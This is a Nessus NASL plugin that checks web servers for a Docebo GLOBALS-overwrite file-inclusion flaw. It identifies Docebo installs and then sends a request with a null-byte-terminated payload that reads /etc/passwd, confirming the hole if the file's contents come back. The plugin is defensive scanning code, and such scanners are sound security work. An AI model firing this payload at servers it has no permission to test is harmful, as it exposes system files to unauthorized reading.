# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#
# Original advisory / discovered by :
# http://milw0rm.com/exploits/1817
#

desc = "
Synopsis :

The remote host contains a PHP application that is vulnerable to
remote and local file inclusions. 

Description :

At least one Docebo application is installed on the remote host. 

Docebo has multiple PHP based applications, including a content
management system (DoceboCMS), a e-learning platform (DoceboLMS) and a
knowledge maintenance system (DoceboKMS)

By using a flaw in some PHP versions (PHP4 <= 4.4.0 and PHP5 <= 5.0.5)
it is possible to include files by overwriting the $GLOBALS variable. 

This flaw exists if PHP's register_globals is enabled. 

See also :

http://secunia.com/advisories/20260/
http://www.hardened-php.net/advisory_202005.79.html
http://www.nessus.org/u?ecd946e9

Solution :

Disable PHP's register_globals and/or upgrade to a newer PHP release. 
The author has also released a patch to address the issues. 

Risk factor :

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
script_description(english:desc);

if (description) {
 script_id(22235);
 script_version("$Revision: 1.2 $");

 script_cve_id("CVE-2006-2576", "CVE-2006-2577");
 script_bugtraq_id(18109);
 if (defined_func("script_xref")) {
  script_xref(name:"OSVDB", value:"25757");
 }

 name["english"] = "Docebo GLOBALS Variable Overwrite Vulnerability";
 script_name(english:name["english"]);

 summary["english"] = "Checks for file inclusions errors in multiple Docebo applications";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006 Ferdy Riphagen");

 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

success = 0;

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/doceboLms", "/doceboKms", "/doceboCms", "/doceboCore", cgi_dirs());
else dirs = make_list(cgi_dirs());
		 
foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port);
 if (res == NULL) exit(0);

 if (egrep(pattern:"^Set-Cookie:.+docebo_session=", string:res) ||
     egrep(pattern:'title="Powered by Docebo(KMS|LMS|CMS)"', string:res) ||
     egrep(pattern:"powered_by.+<a href[^/]+\/\/www\.docebo\.org", string:res)) {
 
  uri = "/lib/lib.php";
  globals[0] = "GLOBALS[where_framework]=";
  globals[1] = "GLOBALS[where_lms]=";
  lfile = "/etc/passwd";

  for(n = 0; globals[n]; n++) { 
   req = http_get(item:string(dir, uri, "?", globals[n], lfile, "%00"), port:port);
   recv = http_keepalive_send_recv(data:req, port:port, bodyonly:1);

   if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
    n++;
    success = 1;
    path += string("http://", get_host_name(),  dir, "\n"); 
    if (!thorough_tests) break;
   }
  }
 }
}

if (success) {
 report = string(desc, "\n\n",
	"Plugin output :\n\n",
	"Below the full path to the vulnerable Docebo application(s):\n\n",
	path);
 security_warning(port:port, data:report);
}
